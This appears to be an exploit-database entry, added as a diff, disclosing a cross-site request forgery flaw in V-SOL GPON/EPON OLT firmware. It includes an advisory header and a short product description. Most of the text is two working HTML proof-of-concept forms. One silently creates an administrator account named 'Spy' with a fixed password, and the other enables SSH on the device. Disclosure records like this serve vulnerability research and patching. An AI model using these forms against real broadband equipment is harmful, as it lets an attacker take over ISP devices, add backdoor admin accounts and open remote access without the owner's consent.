@@ -1,0 +1,71 @@
+# Exploit Title: V-SOL GPON/EPON OLT Platform 2.03 - Cross-Site Request Forgery
+# Author: LiquidWorm 
+# Discovery Date: 2019-09-26 
+# Vendor: Guangzhou V-SOLUTION Electronic Technology Co., Ltd.
+# Product web page: https://www.vsolcn.com
+# Tested on: GoAhead-Webs
+# Advisory ID: ZSL-2019-5536
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5536.php
+# Affected version: V2.03.62R_IPv6
+# V2.03.54R
+# V2.03.52R
+# V2.03.49
+# V2.03.47
+# V2.03.40
+# V2.03.26
+# V2.03.24
+# V1.8.6
+# V1.4
+
+Summary: GPON is currently the leading FTTH standard in broadband access
+technology being widely deployed by service providers around the world.
+GPON/EPON OLT products are 1U height 19 inch rack mount products. The
+features of the OLT are small, convenient, flexible, easy to deploy, high
+performance. It is appropriate to be deployed in compact room environment.
+The OLTs can be used for 'Triple-Play', VPN, IP Camera, Enterprise LAN and
+ICT applications.
+
+Desc: The application interface allows users to perform certain actions via
+HTTP requests without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site.
+
+
+CSRF add admin:
+---------------
+
+<html>
+  <body>
+    <form action="http://192.168.8.200/action/user.html" method="POST">
+      <input type="hidden" name="user_name_add" value="Spy" />
+      <input type="hidden" name="user_password_add" value="pass123" />
+      <input type="hidden" name="password_confirm_add" value="pass123" />
+      <input type="hidden" name="user_role" value="1" />
+      <input type="hidden" name="user_name_mod" value="" />
+      <input type="hidden" name="user_password_mod" value="" />
+      <input type="hidden" name="password_confirm_mod" value="" />
+      <input type="hidden" name="user_role_mod" value="0" />
+      <input type="hidden" name="option_um" value="100/" />
+      <input type="hidden" name="who" value="0" />
+      <input type="submit" value="Init" />
+    </form>
+  </body>
+</html>
+
+
+CSRF enable SSH:
+----------------
+
+<html>
+  <body>
+    <form action="https://192.168.8.200/action/sshglobal.html" method="POST">
+      <input type="hidden" name="ssh_enable" value="1" />
+      <input type="hidden" name="ssh_version" value="2" />
+      <input type="hidden" name="auth_retries" value="6" />
+      <input type="hidden" name="ssh_timeout" value="120" />
+      <input type="hidden" name="ssh_modulus" value="2048" />
+      <input type="hidden" name="who" value="0" />
+      <input type="submit" value="Init" />
+    </form>
+  </body>
+</html>
